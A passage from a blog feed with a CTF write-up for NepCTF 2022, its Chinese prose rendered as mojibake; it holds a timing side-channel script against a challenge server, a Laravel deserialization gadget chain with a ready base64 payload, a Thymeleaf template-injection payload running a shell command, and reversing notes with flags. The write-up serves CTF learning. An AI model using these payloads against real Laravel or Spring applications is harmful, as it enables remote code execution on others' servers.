$sk-u=n$ï¼Œç”±äºé™¤äº†å…¬é’¥å’Œè¿ç®—æ€»æ—¶é—´æ— å…¶ä»–è¾“å‡ºï¼Œåªèƒ½çŒœæµ‹å‡º $u=sk$ã€‚</p><p>ç”±äº $sk$ åªæœ‰8ä½ä¸º1ï¼Œåˆ©ç”¨è¿ç®—æ€»æ—¶é—´ï¼Œå¯ä½œä¸ºä¾§ä¿¡é“ä¿¡æ¯æ¥æµ‹è¯• $sk$ å„ä½ä¸º1æ—¶çš„æ¶ˆè€—æ—¶é—´ï¼Œæµ‹è¯•å‘ç°å½“æ¥è¿‘æ­£ç¡®çš„â€œ1â€ä½æ—¶ï¼Œè¿ç®—æ€»æ—¶é—´ç›¸è¾ƒç›¸é‚»çš„ä¸¤ä½å°ï¼Œé‚£ä¹ˆå¯ä½¿ç”¨æ—¶é—´ä¾§ä¿¡é“æ”»å‡»æ¥æ±‚è§£ç§é’¥ $sk$ã€‚</p><p>å› å°è¯•çš„æ€»æ¬¡æ•°æœ€å¤šä¸º100æ¬¡ï¼Œé‡‡ç”¨åŒºé—´éå†æ³•ç¼©å°å°è¯•æ¬¡æ•°ï¼Œä»¤ $x$ ä¸ºæ¯ä¸ªåŒºé—´é•¿åº¦ï¼Œæ€»æ¬¡æ•° $c=\cfrac{254}{x}+8x \le 100$ï¼Œ$x$ å¯å–å€¼4~8ã€‚</p><p>é‡‡ç”¨ $x=4$ å®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;nep.lemonprefect.cn&#x27;</span>,<span class="number">31135</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">pk=r.recvline().strip()</span><br><span class="line"><span class="built_in">print</span>(pk)</span><br><span class="line"></span><br><span class="line">nowt = <span class="number">100000.0</span></span><br><span class="line">start = []</span><br><span class="line">startt = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">x</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(x))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;used &#x27;</span>)</span><br><span class="line">    time = <span class="built_in">float</span>(r.recvuntil(<span class="string">&#x27; s&#x27;</span>)[:-<span class="number">2</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="keyword">return</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>,<span class="number">4</span>):</span><br><span class="line">    t = send(<span class="number">1</span> &lt;&lt; i)</span><br><span class="line">    <span class="built_in">print</span>(i,t)</span><br><span class="line">    <span class="keyword">if</span> t &gt; nowt:</span><br><span class="line">        start.append(i-<span class="number">4</span>)</span><br><span class="line">        <span class="built_in">print</span>(start)</span><br><span class="line">    nowt = t</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(start)</span><br><span class="line"></span><br><span class="line">ans = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> start:</span><br><span class="line">    nowt = send(<span class="number">1</span> &lt;&lt; k)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        t = send(<span class="number">1</span> &lt;&lt; (k+<span class="number">1</span>+j))</span><br><span class="line">        <span class="keyword">if</span> t &gt; nowt <span class="keyword">and</span> k+<span class="number">1</span>+j-<span class="number">1</span> &lt;= <span class="number">254</span>:</span><br><span class="line">            ans.append(k+<span class="number">1</span>+j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(ans)</span><br><span class="line">        nowt = t</span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"></span><br><span class="line">sk = <span class="built_in">sum</span>([<span class="number">1</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line"><span class="built_in">print</span>(sk)</span><br><span class="line">send(sk)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall())</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Just-Kidding"><a href="#Just-Kidding" class="headerlink" title="Just Kidding"></a>Just Kidding</h3><blockquote><p>é¡½çš®çš„HRPç”¨Laravelå†™äº†ä¸ªé¡¹ç›®æ¥æ¬¢è¿å¤§ä¼™æ¥ç©Nepctf 2ndï¼Œæ²¡æƒ³åˆ°â€¦å±…ç„¶è¢«åè›‹Sharunæ’…äº†</p></blockquote><p>è®¿é—® <code>www.zip</code> ä¸‹è½½æºç ï¼ŒCMSä¸ºLaravel 9.xã€‚</p><p>åœ¨ <code>www\app\Http\Controllers</code> å‘ç° <code>HelloController.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">\Illuminate\Http\Request <span class="variable">$request</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h3</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&quot;h3&quot;</span>));</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$h3</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome Nepctf! GL&amp;HF&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–RCEæ¼æ´ï¼Œä½¿ç”¨ç°æˆé“¾å­å¯ä»¥æ‰“é€šï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Routing</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Validation</span>\<span class="title class_">Validator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingResourceRegistration</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registrar</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$registered</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span>=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$controller</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;registrar=<span class="keyword">new</span> <span class="title class_">Validator</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options=<span class="variable">$cmd</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingResourceRegistration</span>(<span class="string">&#x27;cat /flag&#x27;</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Validation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Validator</span>&#123;    </span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">extensions</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;extensions[<span class="string">&#x27;&#x27;</span>]=<span class="string">&#x27;call_user_func&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payloadï¼š</p><p><code>/hello?h3=Tzo0NjoiSWxsdW1pbmF0ZVxSb3V0aW5nXFBlbmRpbmdSZXNvdXJjZVJlZ2lzdHJhdGlvbiI6NTp7czoxMjoiACoAcmVnaXN0cmFyIjtPOjMxOiJJbGx1bWluYXRlXFZhbGlkYXRpb25cVmFsaWRhdG9yIjoxOntzOjEwOiJleHRlbnNpb25zIjthOjE6e3M6MDoiIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX1zOjEzOiIAKgByZWdpc3RlcmVkIjtiOjA7czo3OiIAKgBuYW1lIjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7czoxMzoiACoAY29udHJvbGxlciI7czo2OiJzeXN0ZW0iO3M6MTA6IgAqAG9wdGlvbnMiO3M6OToiY2F0IC9mbGFnIjt9</code></p><p>â€‹    </p><h3 id="Challenger"><a href="#Challenger" class="headerlink" title="Challenger"></a>Challenger</h3><blockquote><p>é¡½çš®çš„HRPåˆæ¢äº†ç§è¯­è¨€å†™é¡¹ç›®æ¥æ¬¢è¿å¤§å®¶ï¼Œæ²¡æƒ³åˆ°åˆè®©Sharunæ˜äº†ğŸ˜­</p><p>ï¼ˆflagåœ¨æ ¹ç›®å½•ä¸‹: /flagï¼‰</p></blockquote><p>ç”¨jd-guiåç¼–è¯‘ <code>challenger.jar</code> æ–‡ä»¶ï¼Œå‘ç°ä½¿ç”¨äº†Thymeleafæ¨¡æ¿ï¼Œ</p><p>åœ¨ <code>HelloController.class</code> é‡Œå‘ç° <code>/eval</code> è·¯ç”±ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(com.veracode.research.HelloController.class);</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Model model)</span> &#123;</span><br><span class="line">    model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;challenger&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/eval&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">path</span><span class="params">(<span class="meta">@RequestParam</span> String lang)</span> &#123; <span class="keyword">return</span> <span class="string">&quot;user/&quot;</span> + lang + <span class="string">&quot;/welcome&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒ <a href="https://www.cnblogs.com/hetianlab/p/13679645.html">Thymeleaf æ¨¡æ¿æ³¨å…¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œ</a>ï¼Œä¿®æ”¹payloadæ‹¿åˆ°flagï¼š</p><p>Payload:</p><p><code>/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20/flag%22).getInputStream()).next()%7d__::</code></p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="å¿«æ¥ç­¾åˆ°"><a href="#å¿«æ¥ç­¾åˆ°" class="headerlink" title="å¿«æ¥ç­¾åˆ°"></a>å¿«æ¥ç­¾åˆ°</h3><blockquote><p>x86 linux</p></blockquote><p>è¶£å‘³é¢˜ã€‚</p><p>IDAæ‰“å¼€å‘ç°æŠ¥é”™ <code>The graph is too big more than 1000 nodes...</code>ï¼Œä¸” <code>main()</code> å‡½æ•°ä¸­å®šä¹‰å¤šä¸ªå›¾èŠ‚ç‚¹ï¼Œåˆ° IDA - Options - Graph - Max number of nodes é‡Œæ”¹ä¸€ä¸ªå¤§æ•°ä¿å­˜ï¼Œå›åˆ° <code>main()</code> å‡½æ•°åˆ‡æ¢æˆGraph overviewæˆ–è€…IDA Viewä¸­ç¼©å°ï¼Œå¯ä»¥çœ‹åˆ°æ§åˆ¶æµå›¾ï¼ˆCFGï¼‰ï¼š</p><p><img src="/2022/07/17/match-NepCTF-2022/image-20220717213910100.png" alt="image-20220717213910100"></p><p>flagï¼š<code>NepCTF&#123;welc0me_t0_nepctf&#125;</code></p><p>â€‹    </p><h3 id="We-can-gone"><a href="#We-can-gone" class="headerlink" title="We_can_gone"></a>We_can_gone</h3><blockquote><p>æ˜¯å‡ºå‘çš„æ—¶å€™äº†!!!</p></blockquote><p>Goé€†å‘ï¼ŒIDA7.7åˆ†æï¼Œåœ¨Stringçª—å£é‡Œæ‰¾åˆ°å…³é”®å­—ç¬¦ä¸²äº¤å‰å¼•ç”¨å®šä½å…¥å£å‡½æ•° <code>sub_4994E0()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int128 <span class="title function_">sub_4994E0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line">  __int128 result; <span class="comment">// [esp+1Ch] [ebp+4h]</span></span><br><span class="line"></span><br><span class="line">  sub_4993B0(); <span class="comment">// è¾“å‡ºå­—ç¬¦ä¸²&quot;Welcome to NepCTF,I gone on the other side&quot;</span></span><br><span class="line">  v6 = v0;</span><br><span class="line">  v5 = v2;</span><br><span class="line">  sub_433950();</span><br><span class="line">  runtime_printstring(<span class="string">&quot;please input flag to help you get to the other side:\n&quot;</span>, <span class="number">53</span>);</span><br><span class="line">  sub_4339C0();</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xB</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">11</span>] = <span class="number">84</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xC</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">12</span>] = <span class="number">82</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xD</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">13</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0xE</span> )</span><br><span class="line">    sub_459750(v1, v3);</span><br><span class="line">  v6[<span class="number">14</span>] = <span class="number">69</span>;      <span class="comment">// å®šä¹‰å­—ç¬¦ä¸²TRUE</span></span><br><span class="line">  *(_QWORD *)&amp;result = __PAIR64__(v5, (<span class="type">unsigned</span> <span class="type">int</span>)v6);   <span class="comment">// ä¼ªä»£ç æ··ä¹±</span></span><br><span class="line">  DWORD2(result) = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ååŠéƒ¨åˆ†ä¼ªä»£ç ä¸æ¸…æ™°ï¼Œåœ¨è¯¥å‡½æ•°é™„è¿‘å‘ç°åˆ¤æ–­é€»è¾‘å‡½æ•° <code>sub_499630()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_499630</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+0h] [ebp-64h]</span></span><br><span class="line">  <span class="type">int</span> *v2; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-60h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [esp+Ch] [ebp-58h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+10h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">8</span>]; <span class="comment">// [esp+20h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *v7; <span class="comment">// [esp+40h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">2</span>]; <span class="comment">// [esp+44h] [ebp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">2</span>]; <span class="comment">// [esp+4Ch] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">2</span>]; <span class="comment">// [esp+54h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11[<span class="number">2</span>]; <span class="comment">// [esp+5Ch] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">int</span> *)unknown_libname_8((<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  *v2 = <span class="number">0</span>;</span><br><span class="line">  v11[<span class="number">0</span>] = (<span class="type">int</span>)&amp;unk_4A00A0;</span><br><span class="line">  v11[<span class="number">1</span>] = (<span class="type">int</span>)v2;</span><br><span class="line">  fmt_Fscanln((<span class="type">int</span>)&amp;off_4D25B8, dword_54B200, (<span class="type">int</span>)v11, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  v4 = (_BYTE *)sub_4479B0((<span class="type">int</span>)v6, *v7, v7[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">23</span>                      <span class="comment">//è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦æ»¡è¶³23</span></span><br><span class="line">    &amp;&amp; *v4 == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">2</span>] == <span class="string">&#x27;p&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">3</span>] == <span class="string">&#x27;C&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">4</span>] == <span class="string">&#x27;T&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">5</span>] == <span class="string">&#x27;F&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">6</span>] == <span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">    &amp;&amp; v4[<span class="number">22</span>] == <span class="string">&#x27;&#125;&#x27;</span> )               <span class="comment">//è¾“å…¥å­—ç¬¦ä¸²æ»¡è¶³å‰ç¼€NepCTF&#123;ï¼Œåç¼€æ»¡è¶³&#125;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)dword_54B6E4 )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">7</span>) &gt;= <span class="number">0x17</span> )</span><br><span class="line">        sub_459750(v1, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v4[i + <span class="number">7</span>] != *(_BYTE *)(dword_54B6E0 + i) )     <span class="comment">//å°†è¾“å…¥å’Œdword_54B6E0æ¯”è¾ƒ</span></span><br><span class="line">      &#123;</span><br><span class="line">        v9[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">        v9[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D2334;</span><br><span class="line">        unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v9, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v8[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v8[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D233C;</span><br><span class="line">    unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v8, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10[<span class="number">0</span>] = (<span class="type">int</span>)<span class="string">&quot;\b&quot;</span>;</span><br><span class="line">    v10[<span class="number">1</span>] = (<span class="type">int</span>)&amp;off_4D2334;</span><br><span class="line">    unknown_libname_61((<span class="type">int</span>)&amp;off_4D25CC, dword_54B204, (<span class="type">int</span>)v10, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>v4[i + 7] != *(_BYTE *)(dword_54B6E0 + i)</code> æ¯”è¾ƒå¤„ä¸‹æ–­ç‚¹åŠ¨è°ƒï¼ŒæŸ¥çœ‹ <code>dword_54B6E0</code> å­˜æ”¾çš„å€¼ä¸º <code>U9eT_t0_th3TRUE</code>ï¼Œæ•…flagä¸º<code>NepCTF&#123;U9eT_t0_th3TRUE&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>èœã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;â€œNepCTF 2022â€æ˜¯ç”±Nepnepè”åˆç«™é˜Ÿä¸»åŠçš„å…¬ç›Šæ‹›æ–°èµ›äº‹ï¼Œæ—¨åœ¨ä»¥æœ‰ä»£è¡¨æ€§ã€æœ‰ç‰¹è‰²çš„é¢˜ç›®åŸ¹å…»æ–°ç”Ÿç½‘ç»œå®‰å…¨èƒ½åŠ›ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”èµ›æ—¶é—´ï¼š2022å¹´7æœˆ15æ—¥10:00 - 2022å¹´7æœˆ17æ—¥10:00ã€‚&lt;/p&gt;
&lt;p&gt;æ¯”èµ›å½¢å¼ï¼šä¸ªäººè§£é¢˜</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>jsæ··æ·†</title>
    <link href="https://lazzzaro.github.io/2022/06/03/reverse-js%E6%B7%B7%E6%B7%86/"/>
    <id>https://lazzzaro.github.io/2022/06/03/reverse-js%E6%B7%B7%E6%B7%86/</id>
    <published>2022-06-03T14:38:36.000Z</published>
    <updated>2023-06-03T14:51:17.064Z</updated>
    
